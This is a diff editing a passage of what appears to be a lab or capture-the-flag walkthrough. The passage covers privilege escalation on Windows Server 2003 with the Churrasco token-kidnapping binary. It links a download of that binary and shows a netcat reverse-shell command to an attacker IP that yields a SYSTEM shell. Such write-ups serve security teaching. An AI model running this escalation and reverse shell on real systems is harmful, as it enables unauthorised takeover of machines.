@@ -359,10 +359,12 @@ Microsoft Windows Server 2000 - CreateFile API Named Pipe Privilege Escalation (
 Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation         | windows/local/6705.txt
 ```
 
-We can get a binary called `Churrsaco.exe` from [here](https://github.com/Re4son/Churrasco/raw/master/churrasco.exe) which will take in a command and run it as `NT AUTHORITY/SYSTEM`. After transferring it over via `HTTP`, we can use it to run a reverse shell.
+# Exploitation (2)
+
+We can get a binary called `churrasco.exe` from [here](https://github.com/Re4son/Churrasco/raw/master/churrasco.exe) which will take in a command and run it as `NT AUTHORITY/SYSTEM`. After transferring it and a `nc.exe` over via `HTTP`, we can use them to run a reverse shell.
 
 ```
-c:\windows\system32\inetsrv> C:\tmp\exp.exe "C:\\tmp\\nc.exe -e cmd.exe 10.10.14.7 1337"
+c:\windows\system32\inetsrv> C:\tmp\churrasco.exe "C:\\tmp\\nc.exe -e cmd.exe 10.10.14.7 1337"
 ```
 
 Then on our listener that we set up beforehand, we get a shell as `SYSTEM`.
